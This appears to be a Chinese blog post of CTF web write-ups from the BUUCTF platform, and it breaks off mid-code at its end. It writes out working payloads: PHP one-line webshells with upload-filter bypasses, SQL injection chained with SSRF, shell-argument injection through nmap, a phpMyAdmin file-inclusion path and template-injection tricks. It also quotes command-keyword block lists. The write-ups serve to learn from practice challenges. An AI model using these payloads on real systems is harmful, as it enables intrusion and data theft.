将反引号内命令的输出作为输入执行 GXYCTF2019]Ping Ping Ping 做题总结_孙得劲的博客-CSDN博客 [GXYCTF2019]Ping Ping Ping {命令执行总结}_昂首下楼梯的博客-CSDN博客 一些其他的绕过方式 [RoarCTF 2019]Easy Calc进入后是个计算器，查看源码后发现 查看calc.php看到php代码 看到过滤掉了很多字符 尝试传入参数发现仅能传入数字 百度后得知这里设置了waf 可以利用php在解析字符串时会删除空白符并将某些字符转换为下划线的特性绕过 所以尝试在num前加空格 绕过成功 接下来尝试构造命令得到flag 利用scandir函数可读取目录 由于/被过滤 所以利用chr函数绕过 构造 [node3.buuoj.cn:26183/calc.php? num=print_r(scandir(chr(47)))](http://node3.buuoj.cn:26183/calc.php? num=print_r(scandir(chr(47)) 得到 看到有个f1agg 利用readfile或者file_get_contents查看这个文件 ? num=print_r(file_get_contents(chr(47).f1agg)) [极客大挑战 2019]Upload先做个一句话木马，上传后显示 用bp抓包然后修改Content-Type为image/jpeg Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件， 放包后又显示不能为php 百度得知绕过后缀的有文件格式有php, ,php4,php5,phtml.pht 试一试 发现可用phtml绕过 但又提示 把文件内容改为 又提示 在一句话木马前加个文件头GIF89a(GIF89a图片头文件欺骗) Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;Content-Type: image/jpeg GIF89a @eval($_POST[\"a\"]); 上传成功 猜测上传地址为/upload/ 菜刀连接 在根目录下找到flag [ACTF2020 新生赛]Upload文件上传，先传个一句话木马试试 弹出js， 看一下源码 把这个事件remove掉 上传后又提示 试试改改后缀名，发现phtml可以成功上传 菜刀连接 在虚拟终端中利用cat命令找到flag [ACTF2020 新生赛]BackupFile根据题目得知有.bak的备份文件，访问一下index.php.bak得到备份文件 代码审计可知要传入key的值与str的值相等，且key只能为数字类型 因为==是弱类型比较，根据php的性质可传入?key=123 得到flag [极客大挑战 2019]BuyFlag到payflag的页面发现有两个条件 查看源码 抓个包 将user改为1可满足第一个条件 之后要以post方式传入一个值令其等于404且不能为纯数字 所以post password=404a 提示要pay for the flag 猜测要post进money=100000000 传入后提示数字过长 采用科学计数法，得到flag [SUCTF 2019]CheckIn进入后看起来像是上传一句话木马的题 先传一个正常的 提示illegal suffix!非法后缀 改个后缀名试试 改成.jpg文件后成功绕过，但又提示&lt;? in contents! 猜测&lt;?被过滤了 修改后 最后再加个GIF89a文件头，绕过最后一个exif_imagetype函数的检测 虽然成功上传了但菜刀无法连接 百度一下wp .user.ini 1、auto_prepend_file 在页面顶部加载文件 2、auto_append_file 在页面底部加载文件 某网站限制不允许上传.php文件，可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。在含有.user.ini的文件夹下要有正常的php文件 再上传一个.user.ini 上传后我们访问此目录下的任何一个文件时，都会去包含first.jpg, 根据其返回的地址用菜刀连接 找到flag [ZJCTF 2019]NiZhuanSiWei 看见file_get_contents(),利用伪协议data://text/plain;base64绕过 再利用php://filter读取useless内的内容 解码后 可知flag在flag.php中 试图让file=flag.php 看到unserialize函数，利用php反序列化 构造payload ？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} 查看源码找到flag [极客大挑战 2019]PHP页面中提示有备份文件，御剑扫一遍 找到存在www.zip 重点在class.php和index.php中 所以要传入一个select参数，利用反序列化让username=admin password=100 因为username和password两个为private类型 所以有隐藏的空格符 select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot; [MRCTF2020]你传你🐎呢先传个.htaccess文件，为了解析图片码 htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。 笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。 SetHandler application&#x2F;x-httpd-php &#x2F;&#x2F;该语句作用是让Apache将其他类型文件均以php格式解析 再传个一句话木马，然后bp抓包 只有将其改为图片的类型才能成功上传 根据返回的路径用菜刀连接 [MRCTF2020]Ez_bypass进入后代码审计 先get进两个md5值相等的内容 md5无法处理数组，会返回NULL，使其相等 再根据php的特性post进passwd=1234567a绕过if 获得flag [护网杯 2018]easy_tornado从提示可以看出来这个tornado是一个python的模板，在web使用的时候给出了四个文件，可以访问，从提示中和url中可以看出，访问需要文件名+文件签名（长度为32位，计算方式为md5(cookie_secret + md5(filename))）; flag文件名题目已给出 /fllllllllllag 所以要做的就是要获得到cookie值 这里是采用模板注入的方式 这里可以猜出来存在模板注入漏洞而且应该存在过滤 然后百度看一下wp 在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，具体定义可以[参考Tornado官方文档](http:&#x2F;&#x2F;tornado.readthedocs.org&#x2F;en&#x2F;latest&#x2F;guide&#x2F;templates.html#template-syntax)！ 所以可以利用这个来读取cookie_secret 然后对其进行md5加密就能得到flag了 [HCTF 2018]adminHCTF2018-admin_迷风小白-CSDN博客 注册个账户登录后可以在修改密码页面的源码注释中找到提示 查看可以找到题目源码 一、 session伪造 flask中session是存储在客户端cookie中的，也就是存储在本地。flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的 找到session后利用py脚本进行解码 依照题意可以猜测只有用admin账户登录才能得到flag，所以要伪造session来使我们被认为是admin账户 重新编码session时需要用到secret_key可以在config.py中找到 伪造session 修改后刷新页面得到flag 二：Unicode欺骗 代码审计可以看出在登录注册和修改密码时都存在用户名的小写转换 看一下strlower Twisted版本为10.2.0，而目前(2020/10/28)Twisted最新版本已有20.3.0，这里使用的版本非常旧10.2.0版的nodeprep.prepare()对一些特殊的Unicode编码处理后会得到一个正常的字符。可以知道当使用了nodeprep.prepare()函数之后，如果我们先使用unicode的编码的字符，比如说 ᴬ ，使用该函数之后，他会先变成大写的A，再使用一次就会变成小写的a。 所以可以注册一个ᴬᴰᴹᴵᴺ用户再通过登录和修改密码两次令其变为admin Basic Latin — ✔️ ❤️ ★ Unicode Character Table (unicode-table.com)可以从这个网站查字符 这里登录之后进行修改密码，则通过小写转换就会变为修改admin账户的密码 三、弱密码 用户admin密码为123 爆破或者试一试就能试出来密码 [BJDCTF2020]Easy MD5进入后只有一个提交框，没啥思路，先用bp抓个包 看见有个hint select * from &#39;admin&#39; where password=md5($pass,true) 然后猜这里应该要利用sql注入的，但我不会了x 看了一下说是要用ffifdyop来绕过，因为这个字符串经过md5之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是&#39; or &#39;6 就会构成万能密码 成功进入下一步，先查看源码 利用md5不能处理数组会返回null的特性就能绕过，接下来进行代码审计 同样可以利用md5不能处理数组的特性 [网鼎杯 2018]Fakebook先join一下，然后源码里有 这里过滤了union select 中间可以加个注释符来当空格来绕过去 这个页面存在注入点， 有两种方法，一种是直接sql读文件，另一种是ssrf 一. 借助联合查询可以看到user()是root，所以直接猜文件位置 二. sql注入查到底，最终可以查到这些 这里能看出来data是个序列化后的结果，但是不知道有什么用 看一眼这个 解码之后发现是百度首页的源码 然后扫一下发现 有robots.txt备份文件 &lt;?php class UserInfo &#123; public $name &#x3D; &quot;&quot;; public $age &#x3D; 0; public $blog &#x3D; &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name &#x3D; $name; $this-&gt;age &#x3D; (int)$age; $this-&gt;blog &#x3D; $blog; &#125; function get($url) &#123; $ch &#x3D; curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output &#x3D; curl_exec($ch); $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode &#x3D;&#x3D; 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog &#x3D; $this-&gt;blog; return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog); &#125; &#125; 好，看不懂了（ 抄一下别人的分析 &lt;?php class UserInfo &#123; public $name &#x3D; &quot;&quot;; public $age &#x3D; 0; public $blog &#x3D; &quot;&quot;; public function __construct($name, $age, $blog) &#123; $this-&gt;name &#x3D; $name; $this-&gt;age &#x3D; (int)$age; $this-&gt;blog &#x3D; $blog; &#125; function get($url) &#123; $ch &#x3D; curl_init(); &#x2F;*curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用*&#x2F; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); &#x2F;* curl_setopt — 为给定的cURL会话句柄设置一个选项。 说明： bool curl_setopt ( resource $ch , int $option , mixed $value ) 参数: ch：由 curl_init() 返回的 cURL 句柄。 option：需要设置的CURLOPT_XXX选项。 value：将设置在option选项上的值。 对于下面的这些option的可选参数，value应该被设置一个bool类型的值： CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。 对于下面的这些option的可选参数，value应该被设置一个string类型的值： CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。 ################### 文件流的形式:指的是在传递过程中的文件,比如你上传一张图片,那么他不是以一个完整的图片传输的,是将文件按特定编码的字符传输.这个就是文件流 *&#x2F; $output &#x3D; curl_exec($ch); &#x2F;*curl_exec ：执行 cURL 会话*&#x2F; $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE); &#x2F;* curl_getinfo — 获取一个cURL连接资源句柄的信息 说明： mixed curl_getinfo ( resource $ch [, int $opt &#x3D; 0 ] )获取最后一次传输的相关信息。 参数： ch 由 curl_init() 返回的 cURL 句柄。 opt：这个参数可能是以下常量之一: CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码 *&#x2F; if($httpCode &#x3D;&#x3D; 404) &#123; return 404; &#125; curl_close($ch); return $output; &#125; public function getBlogContents () &#123; return $this-&gt;get($this-&gt;blog); &#125; public function isValidBlog () &#123; $blog &#x3D; $this-&gt;blog; return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog); &#125; cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。 cURL还包含了用于程序开发的libcurl。 PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。 libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。 PHP中使用cURL实现Get和Post请求的方法 这些函数在PHP 4.0.2中被引入。 新知识：这里利用了ssrf漏洞 SSRF漏洞攻击原理及防御方案 - FreeBuf网络安全行业门户 SSRF 漏洞记录_发哥微课堂-CSDN博客 SSRF漏洞(原理&amp;绕过姿势) - T00ls.Net SSRF（Server-Side Request Forgery）也属于应用层上的一个漏洞类型，用一个最简单的例子来理解这个漏洞：比如一个添加图文的功能，填入标题内容和封面图然后提交在网站前台显示，对于这个功能的图片它除了可以让你上传以外，还支持填入远程图片地址，如果你填入了远程的图片地址，则该网站会加载远程图过来进行显示，而如果程序写法不严谨或者过滤不严格，则加载图片地址的这个功能可能就可以包含进行一些恶意的脚本文件，或者你输入内网的 ip 或者一些系统的文件都会被解析执行，这个我们一般叫它 SSRF 即服务端请求伪造。 curl 使用的经典过程，初始化，然后设置访问的地址，随后执行，最后关闭。 将URL换成file://的形式，就可以读取本地文件。 这里我们要访问的是flag.php，所以按照之前sql注入得出来的序列化内容进行修改 最终payload为 ?no&#x3D;-1%20union&#x2F;**&#x2F;select 1,(select%20group_concat(no,username,passwd,data)%20from%20users),3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:27:&quot;file:&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39; 看一下源码，找到flag [GXYCTF2019]BabyUpload这个和之前一个文件上传的题差不多，上传时过滤了ph后缀名，所以要上传个图片马，同时还要上传个.htaccess文件解析图片马，用bp抓包把类型改成image/jpeg就行 然后菜刀连一下在根目录里就能找到flag [BUUCTF 2018]Online Tool先直接贴参考的文章了 BUUCTF 2018]Online Tool_题解_风过江南乱的博客-CSDN博客 [BUUCTF 2018]Online Tool_沐目的博客-CSDN博客 谈谈escapeshellarg参数绕过和注入的问题 (lmxspace.com) PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org) BUUCTF 2018]Online Tool - nmap\\escapeshellarg与escapeshellcmd连用_M4xlmum的博客-CSDN博客 先是代码审计，又是没见过的东西 第一个if语句好像没啥用 在PHP 中使用 $_SERVER[&quot;REMOTE_ADDR&quot;] 来取得客户端的 IP地址，但如果客户端是使用代理服务器来访问，那取到的就 是代理服务器的 IP 地址，而不是真正的客户端 IP 地址。要想透过代理服务器取得客户端的真实 IP 地址，就要使用 $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] 来读取。 不过要注意的事，并不是每个代理服务器都能用 $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] 来读取客户端的真实IP，有些用此 方法读取到的仍然是代理服务器的 IP。 第二个if语句是要求传入一个参数然后利用escapeshellarg和escapeshellcmd两个函数的漏洞实现system命令执行 escapeshellarg，会在字符串中所有的单引号（包括成对存在闭合的）前添加一个&#39;\\&#39; ，若已经用\\转义，则会用&#39;\\&#39;&#96;替换\\，最后将整个变量用单引号包裹。 escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。反斜线（\\）会在以下字符之前插入： &amp;#;&#96;|\\?~&lt;&gt;^()[]&#123;&#125;$*, \\x0A 和 \\xFF。’ 和 “ 仅在不配对的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 这个漏洞类似这种 mkdir命令是Linux中的新建文件夹 chdir改变目录 最后就是system的命令执行了，这里面是nmap的一些命令 -T5 :扫描等级,越大越快,越快越不安全,最好设置为-T4 -sT :TCP connent 扫描,不太安全(留下记录信息),而且速度较慢,一般先使用-sS测试 -Pn :禁用ping -host-timeout 2:设置扫描一台主机的时间，以毫秒为单位。 -F :快速扫描模式，只扫描在nmap-services文件中列出的端口。 -oG test.txt: 将扫描结果生成 test.txt 文件 接下来就是想办法利漏洞给里面传入一个一句话木马 payload &#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39; 然后经过escapeshellarg和escapeshellcmd两个函数就会变成类似这种 &#39; &#39;\\\\&#39;&#39;\\&lt;\\?php eval\\(\\)\\;\\?\\&gt; -oG 1.php &#39;\\\\&#39;&#39; &#39; 这里单引号都闭合了不会影响到传入的一句话木马 之后就可以用菜刀连接找flag了 e9612257fa1c5134d014e95a7440d357 这是上传后的地址 菜刀连一下http://d26a51d3-a34a-46e5-9be3-80b3a129befb.node4.buuoj.cn/ e9612257fa1c5134d014e95a7440d357/1.php 根目录找到flag [RoarCTF 2019]Easy Java首先是个登录框 看一下help的内容 试试抓包然后改一下请求方式后会下载一个word文档，没啥用 这里是WEB-INF/web.xml泄露 WEB-INF主要包含一下文件或目录: &#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 &#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 &#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 &#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。 &#x2F;WEB-INF&#x2F;database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 漏洞成因 通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^&#x2F;WEB-INF&#x2F;* &#123; deny all; &#125; 或者return 404; 或者其他！ 漏洞利用 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 所以先访问一下WEB-INF/web.xml 这个路径com.wm.ctf.IndexController应该和flag有关 所以试试访问一下 看到有块类似base64 解码得到flag [GXYCTF2019]禁止套娃GXYCTF2019]禁止套娃_TzZzEZ-web的博客-CSDN博客 GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com) 题目存在git泄露，用GitHack扫一下得到源码 可以猜到这里利用了eval进行命令执行，但是过滤了很多东西 1.需要以GET形式传入一个名为exp的参数。如果满足条件会执行这个exp参数的内容。 2.过滤了常用的几个伪协议，不能以伪协议读取文件。 3.(?R)引用当前表达式，后面加了?递归调用。只能匹配通过无参数的函数。 4.正则匹配掉了et&#x2F;na&#x2F;info等关键字，很多函数都用不了。 5：eval($_GET[&#39;exp&#39;]); 典型的无参数RCE PHP Parametric Function RCE · sky&#39;s blog (skysec.top)关于无参数rce 首先要读取目录内容， 可以用print_r(scandir(&#39;.&#39;)); 但是因为不能传参，所以要想把.用函数代替 这里有两个函数可以利用 localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是. current() 返回数组中的当前单元, 默认取第一个值 所以current(localeconv())永远是个. 也就可以用print_r(scandir(current(localeconv())));来读目录 可以看到flag就在flag.php中 现在要想办法把它读出来 这里可以利用array_reverse()和next函数 通过array_reverse() 函数返回翻转顺序的数组。（反转之后flag.php被放在第二个数组之中）next() 函数将内部指针指向数组中的下一个元素，并输出。payload为： ？exp&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 也可以利用 array_flip()交换数组的键和值 array_rand()从数组中随机取出一个或多个单元 最后再利用readfile函数读出文件或者用show_source让它高亮显示 由于array_rand是随机的，所以要多刷新几次才可能会显示flag.php的内容 [GWCTF 2019]我有一个数据库御剑是真的不好用。。。phpmyadmin路径死活扫不出来 这里phpmyadmin版本是4.8.1 由于phpmyadmin4.8.0-4.8.1存在文件包含漏洞 直接用payload打 ?target=db_datadict.php%253f/../../../../../../../../flag [BJDCTF2020]The mystery of ip这道题第一眼看上去像是本地访问的题目 但是hint有感觉不太像 抓包修改xff头后就没思路了，查了一下发现是smarty模板注入 看到这里支持逻辑运算，可以直接解析，所以就可以利用系统命令来读flag Smarty SSTI利用 (1条消息) PHP的模板注入（Smarty模板）_WHOAMIAnony的博客-CSDN博客_smarty模板注入 Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。 漏洞确认 一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。 常规利用方式 Smarty支持使用&#123;php&#125;&#123;/php&#125;标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。 {literal} 标签 &#123;literal&#125;可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。 若该题环境为php5，则可以 &lt;script language&#x3D;&quot;php&quot;&gt;phpinfo();&lt;&#x2F;script&gt; 静态方法 通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。 在3.1.30的Smarty版本中官方已经把该静态方法删除 {if}标签官方文档中看到这样的描述： Smarty的{if}条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||, or, &amp;&amp;, and, is_array(), 等等，如：{if is_array($array)}{/if} [BJDCTF2020]ZJCTF，不过如此第一部分 可以用伪协议读取，但是不知道为什么我用hackbar时没成功 也可以用这个payload text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,SSBoYXZlIGEgZHJlYW0&#x3D;&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;next.php base64解码 当pattern传入的正则表达式带有/e时，存在命令执行，即当匹配到符合正则表达式的字符串时，第二个参数的字符串可被当做代码来执行。思路是利用这个代码执行，执行源码中的getFlag()函数，在传入cmd参数，再利用getFlag中的eval（）函数，再进行一个代码执行。 深入研究preg_replace与代码执行 - 先知社区 (aliyun.com) 这里第二个参数固定为strtolower(&quot;\\\\1&quot;)这里的\\\\1实际上体现为\\1 \\1 在正则表达式中有自己的含义: 反向引用对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问 这里的\\1指的是第一个匹配项 这里我们就要利用这个漏洞来运行getflag函数，并同时给cmd传参，利用system来执行命令 为了实现运行getflag的目的，就要先让\\1为getflag(),也就是传入 .*={${getFlag()}} 原先的语句： preg_replace(&#39;&#x2F;(&#39; . $regex . &#39;)&#x2F;ei&#39;, &#39;strtolower(&quot;\\\\1&quot;)&#39;, $value); 变成了语句： preg_replace(&#39;&#x2F;(.*)&#x2F;ei&#39;, &#39;strtolower(&quot;\\\\1&quot;)&#39;,&#123;$&#123;getFlag()&#125;&#125;); 这样通过preg_replace后就会运行getflag函数，但是由于php特性.传入后会变为_所以这里要利用正则匹配中的\\S 所以传入的payload为\\S*={${getFlag()}} \\S 在php正则表达式中表示匹配所有非空字符，*表示多次匹配 最终payload为?\\S*={${getFlag()}}&amp;cmd=system(&quot;cat /flag&quot;); [BJDCTF2020]Mark loves cat整吐了知道是git泄露但是用githack扫完之后就是没有源码。。。 借一下百度的wp的源码 index.php &lt;?php include &#39;flag.php&#39;; $yds &#x3D; &quot;dog&quot;; $is &#x3D; &quot;cat&quot;; $handsome &#x3D; &#39;yds&#39;; foreach($_POST as $x &#x3D;&gt; $y)&#123; $$x &#x3D; $y; &#125; foreach($_GET as $x &#x3D;&gt; $y)&#123; $$x &#x3D; $$y; &#125; foreach($_GET as $x &#x3D;&gt; $y)&#123; if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; &#39;flag&#39;)&#123; exit($handsome); &#125; &#125; if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123; exit($yds); &#125; if($_POST[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39; || $_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; &#39;flag&#39;)&#123; exit($is); &#125; echo &quot;the flag is: &quot;.$flag; flag.php &lt;?php $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;); 前两个foreach语句分别将POST参数和GET参数进行变量覆盖，接着是三个if语句，exit()函数退出脚本的同时输出变量，最后一句是输出我们想要的flag。 首先我们想到的是让脚本执行到最后一句echo $flag;，但即使绕过三个if语句，我们GET传参或者POST传参的flag总会被变量覆盖：如我们GET传参flag=aaa，在第二个foreach语句中变成$flag = $aaa，而$aaa变量没有定义为空，最后的输出就是空 但是由于变量覆盖的原因最终不会显示flag 而exit()函数虽然会退出执行，但也会输出其参数，我们可以利用变量覆盖将exit()函数内的参数用$flag覆盖掉就能输出flag了； 所以我们可以借助后两个if语句中的exit来输出flag 当我们get yds=flag时，满足第二个if判断，而由于第一个foreach语句，$yds=$flag，所以最终就会变成exit($flag); 还可以借助第三个if语句，当我们get flag=flag&amp;is=flag后经过第二个foreach语句$flag=$flag，$is=$flag对flag自身无影响，又因为满足第三个if语句，也会输出flag值 BJDCTF2020]Mark loves cat (两种解法)（变量覆盖漏洞）_Zero_Adam的博客-CSDN博客 BJDCTF2020]Mark loves cat_qtL0ng的博客-CSDN博客 [安洵杯 2019]easy_web进入后看到img参数像base64，解码两次再用16进制转字符串会变成555.png 所以为了想读取源码，我们将index.php按照相同的方式加密后变为 TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 修改后替换img原来的值，发现依旧返回了一大串base64编码，解码后可获得源码 重点： if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;; &#125; else &#123; if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123; echo &#96;$cmd&#96;; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125; &#125; 先看第二个if里的md5的比较，传数组或者传md5值为0e开头的都没法绕过去 (1条消息) 浅谈PHP中哈希比较缺陷问题及哈希强比较相关问题_末初 · mochu7-CSDN博客 MD5碰撞的一些例子 - 简书 (jianshu.com) 从这两篇文章里能找到存在文件十六进制字节流数据的哈希值相等 再考虑到要将一些不可见字符传到服务器，这里可以使用url编码 最终 a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 这里要绕过两个if语句，然后执行cmd中的参数，所以可以利用反斜杠绕过，在正则表达式中三个反斜杠才能匹配到反斜杠， (1条消息) 【PHP】之4个反斜杠、3个反斜杠的情况_Hertter的博客-CSDN博客 为什么3反斜杠在php中等于4反斜杠？ - Thinbug 题目里的正则其实有些问题，所以虽然存在了四个反斜杠但是依旧没有过滤掉反斜杠 贴个大佬的文章 从一道CTF的非预期解看PHP反斜杠匹配问题 - 简书 (jianshu.com) 可以先用dir查看目录 ca\\t%20/flag来绕过第一个if 用\\的原因是因为在linux下行尾输\\可以换行并且继续输入命令 这里正则匹配漏了uniq和sort，用这俩也能拿到flag [网鼎杯 2020 朱雀组]phpweb先抓包 发现有两个post的参数 然后根据报错的信息 这里用了call_user_func函数，也就是func是函数名，p是参数 用system试时发现被过滤了，发现file_get_contents函数可以用 file_get_contents拿源码 &lt;?php $disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result &#x3D; call_user_func($func, $p); $a&#x3D; gettype($result); if ($a &#x3D;&#x3D; &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p &#x3D; &quot;Y-m-d h:i:s a&quot;; var $func &#x3D; &quot;date&quot;; function __destruct() &#123; if 